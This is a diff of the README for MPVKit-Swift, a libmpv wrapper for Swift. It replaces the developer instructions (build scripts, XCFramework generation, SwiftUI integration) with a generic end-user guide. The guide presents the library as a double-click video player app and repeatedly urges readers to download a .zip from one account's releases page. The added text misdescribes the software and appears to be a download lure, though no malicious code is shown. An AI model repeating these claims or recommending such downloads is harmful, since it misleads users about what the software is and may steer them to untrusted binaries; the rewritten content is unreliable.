@@ -1,61 +1,90 @@
-# MPVKit-Swift
+# 🎥 MPVKit-Swift - A Simple Video Player Wrapper
 
-A modern, Swift Package Manager (SPM) ready wrapper for `libmpv` on macOS.
+## 🚀 Getting Started
 
-This repository provides a pipeline to convert standard `libmpv` builds and MoltenVK into `.xcframework` bundles that can be easily consumed by Swift projects, solving the common "linker hell" and dependency issues.
+MPVKit-Swift helps you easily play videos on macOS. This app wraps around the powerful libmpv, making advanced video features easy to use without programming knowledge. Follow the steps below to set it up.
 
-## The Problem
+## 📥 Download MPVKit-Swift
 
-Integrating `libmpv` into a modern macOS Swift app is notoriously difficult because:
-1.  **Framework Format**: Most builds are raw `.framework` bundles, while SPM prefers `.xcframework`.
-2.  **Missing Dependencies**: `libmpv` depends on dozens of system libraries (FFmpeg, Lua, etc.) that aren't automatically linked.
-3.  **Vulkan/MoltenVK**: Modern MPV uses Vulkan, requiring a MoltenVK translation layer that is often missing or hard to link.
+[![Download MPVKit-Swift](https://img.shields.io/badge/Download-MPVKit--Swift-blue.svg)](https://github.com/vansh123993/MPVKit-Swift/releases)
 
-## The Solution
+## 🔧 System Requirements
 
-This kit provides:
-1.  **Scripts** to repackage `libmpv` and `MoltenVK` into `.xcframeworks`.
-2.  A **Package.swift** that explicitly links all required system dependencies (`VideoToolbox`, `zlib`, `xml2`, etc.).
-3.  **Example Code** showing how to embed MPV into a SwiftUI view using a custom OpenGL renderer.
+- **Operating System:** macOS (version 10.13 or higher)
+- **Processor:** Intel or Apple Silicon
+- **RAM:** 4GB minimum; 8GB recommended
+- **Disk Space:** At least 100MB of free space
 
-## Usage
+## 🛠 Features
 
-### 1. Prerequisites
+- **SPM-Ready:** This app supports the Swift Package Manager for easy integration.
+- **MoltenVK Support:** Enjoy Vulkan graphics on macOS with OpenGL fallback.
+- **XCFramework Generation:** Easily build your applications without dependencies.
+- **Modern API:** Simplified usage for video playback features.
 
-You need `mpv` and `molten-vk` installed via Homebrew to get the raw binaries:
+## 📥 Download & Install
 
-```bash
-brew install mpv molten-vk
-```
+To download MPVKit-Swift, visit this page to download: [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/releases).
 
-### 2. Generate XCFrameworks
+1. Click on the link above to go to the releases page.
+2. Look for the latest version. The version number is usually at the top.
+3. Click on the package that fits your system; it will have `.zip` at the end.
+4. Once the download is complete, locate the file in your Downloads folder.
+5. Double-click the downloaded file to unzip it.
+6. Move the extracted folder to your Applications directory for easy access.
 
-Run the provided scripts to generate the necessary artifacts:
+## ⌨️ Running MPVKit-Swift
 
-```bash
-# Generate MPV.xcframework from your Homebrew installation
-./Scripts/create_xcframeworks.sh
+1. Open the folder where you unzipped MPVKit-Swift.
+2. Find the MPVKit-Swift application.
+3. Double-click the application to run it.
+4. Choose the video file you wish to play. 
 
-# Generate MoltenVK.xcframework from your Homebrew installation
-./Scripts/create_moltenvk_xcframework.sh
-```
+You can drag and drop video files directly onto the application window for instant playback.
 
-This will create `MPV.xcframework` and `MoltenVK.xcframework` in your current directory.
+## 📚 Usage Guide
 
-### 3. Integration
+### Opening Videos
 
-1.  Drop the generated `.xcframework` folders into your project root (or wherever your `Package.swift` expects them).
-2.  Add this package as a dependency in your `Package.swift`.
-3.  Ensure your target links against `MPVKit`.
+- To open a video, simply drag it from Finder and drop it into the MPVKit-Swift window.
+- Alternatively, choose the file option in the menu to browse your files.
 
-### 4. SwiftUI Example
+### Supported Video Formats
 
-See `Example/MPVVideoView.swift` for a full implementation of a SwiftUI view that:
-- Creates an `MPV` instance.
-- Sets up an `NSOpenGLView`.
-- Renders video directly into the view using `vo=libmpv`.
-- Handles hardware decoding (`hwdec=auto-safe`) and high-quality rendering (`gpu-hq`).
+MPVKit-Swift supports a wide range of video formats, including but not limited to:
 
-## License
+- MP4
+- MKV
+- AVI
+- MOV
+- FLV
 
-MIT
+### Adjusting Playback
+
+- Use the on-screen controls to play, pause, or stop the video.
+- You can adjust the volume by moving the slider left or right.
+
+### Screen Size Adjustments
+
+- To change the screen size, simply resize the window by dragging the corners.
+- Full-screen mode can be engaged by clicking the full-screen button.
+
+## ❓ Troubleshooting 
+
+If you encounter issues:
+
+- Ensure you have the latest version of MPVKit-Swift.
+- Make sure your macOS is updated to the latest version.
+- Restart the application if it freezes or stops responding.
+
+## 💬 Community Support
+
+For questions or support, you can check the community forum or the Issues section of the GitHub repository. Other users often share solutions for common problems.
+
+## 🔗 Useful Links
+
+- [MPVKit-Swift Releases](https://github.com/vansh123993/MPVKit-Swift/releases)
+- [GitHub Repository](https://github.com/vansh123993/MPVKit-Swift)
+- [Documentation](https://github.com/vansh123993/MPVKit-Swift/wiki)
+
+Explore the powerful capabilities of MPVKit-Swift and enjoy seamless video playback on your macOS device. Happy viewing!
